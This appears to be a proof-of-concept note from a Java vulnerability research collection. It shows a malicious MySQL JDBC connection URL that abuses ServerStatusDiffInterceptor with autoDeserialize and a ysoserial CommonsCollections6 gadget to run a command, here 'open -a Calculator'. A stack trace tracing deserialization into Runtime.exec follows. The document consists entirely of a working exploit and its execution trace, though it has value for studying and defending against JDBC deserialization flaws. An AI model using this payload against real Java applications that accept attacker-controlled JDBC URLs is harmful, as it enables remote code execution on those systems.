## poc
```java
// MySQL_Fake_Server
String driver = "com.mysql.cj.jdbc.Driver";
String url = "jdbc:mysql://localhost:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true&user=yso_CommonsCollections6_open%20-a%20Calculator";
Class.forName(driver);
Connection conn = DriverManager.getConnection(url);
```

## stack
```java
exec:347, Runtime (java.lang)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
transform:126, InvokerTransformer (org.apache.commons.collections.functors)
transform:123, ChainedTransformer (org.apache.commons.collections.functors)
get:158, LazyMap (org.apache.commons.collections.map)
getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)
hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)
hash:339, HashMap (java.util)
put:612, HashMap (java.util)
readObject:342, HashSet (java.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invokeReadObject:1185, ObjectStreamClass (java.io)
readSerialData:2234, ObjectInputStream (java.io)
readOrdinaryObject:2125, ObjectInputStream (java.io)
readObject0:1624, ObjectInputStream (java.io)
readObject:464, ObjectInputStream (java.io)
readObject:422, ObjectInputStream (java.io)
getObject:1325, ResultSetImpl (com.mysql.cj.jdbc.result)
resultSetToMap:46, ResultSetUtil (com.mysql.cj.jdbc.util)
populateMapWithSessionStatusValues:87, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)
preProcess:105, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)
preProcess:76, NoSubInterceptorWrapper (com.mysql.cj)
invokeQueryInterceptorsPre:1138, NativeProtocol (com.mysql.cj.protocol.a)
sendQueryPacket:964, NativeProtocol (com.mysql.cj.protocol.a)
sendQueryString:915, NativeProtocol (com.mysql.cj.protocol.a)
execSQL:1182, NativeSession (com.mysql.cj)
setAutoCommit:2057, ConnectionImpl (com.mysql.cj.jdbc)
handleAutoCommitDefaults:1377, ConnectionImpl (com.mysql.cj.jdbc)
initializePropsFromServer:1322, ConnectionImpl (com.mysql.cj.jdbc)
connectOneTryOnly:963, ConnectionImpl (com.mysql.cj.jdbc)
createNewIO:822, ConnectionImpl (com.mysql.cj.jdbc)
<init>:456, ConnectionImpl (com.mysql.cj.jdbc)
getInstance:240, ConnectionImpl (com.mysql.cj.jdbc)
connect:207, NonRegisteringDriver (com.mysql.cj.jdbc)
getConnection:664, DriverManager (java.sql)
getConnection:270, DriverManager (java.sql)
main:11, JDBCVuln (com.kuron3k0.javavulns)
```
